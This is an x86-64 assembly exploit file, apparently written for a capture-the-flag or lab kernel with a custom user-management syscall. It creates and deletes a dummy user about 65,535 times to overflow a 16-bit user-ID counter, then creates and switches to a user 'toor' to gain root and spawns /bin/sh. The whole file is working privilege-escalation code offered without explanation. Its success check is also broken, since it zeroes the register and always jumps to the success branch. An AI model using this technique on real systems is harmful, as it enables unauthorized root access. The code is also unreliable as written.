global exploit
global overflowed_short

[section .data]

dummy: db "dummy", 0x0
username: db "toor", 0x0
password: db "toor", 0x0

success: db "SUCCESS", 0xA, 0x0
failure: db "FAILURE", 0xA, 0x0

bin_sh: db "/bin/sh", 0

buf: db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0

[section .text]

getuid:
    mov rax, 0x66
    syscall
    ret

create_user:
    mov rax, 0x1c1
    mov rdx, rsi
    mov rsi, rdi
    mov rdi, 0x0
    syscall
    ret

delete_user:
    mov rax, 0x1c1
    mov rsi, rdi
    mov rdi, 0x2
    syscall
    ret

switch_user:
    mov rax, 0x1c1
    mov rdx, rsi
    mov rsi, rdi
    mov rdi, 0x3
    syscall
    ret

write:
    mov rax, 0x1
    mov rdx, rsi
    mov rsi, rdi
    mov rdi, 0x1
    syscall
    ret

execve:
    mov rax, 0x3b
    push 0x0
    push rdi
    xor rdx, rdx
    mov rsi, rsp
    syscall
    ret

exit:
    mov rax, 0x3c
    syscall

exploit:
    call getuid
    mov r10, rax ; UID

    .loop_start:
        mov rdi, dummy
        mov rsi, dummy
        call create_user  ; create dummy

        mov rdi, dummy
        call delete_user  ; delete dummy

        inc r10
        cmp r10, 65535
        jl .loop_start

        call overflowed_short

        mov rdi, rax
        call exit

overflowed_short:
        mov rdi, username
        mov rsi, password
        call create_user  ; create user

        xor rax, rax
        mov rdi, username
        mov rsi, password
        call switch_user

        call getuid

        xor eax, eax
        jz .success

        mov rdi, failure
        mov rsi, 0x8
        call write

        mov rdi, rax
        call exit

    .success:
        mov rdi, success
        mov rsi, 0x8
        call write

        mov rdi, bin_sh
        call execve

        mov rdi, success
        mov rsi, 0x8
        call write

        call exit
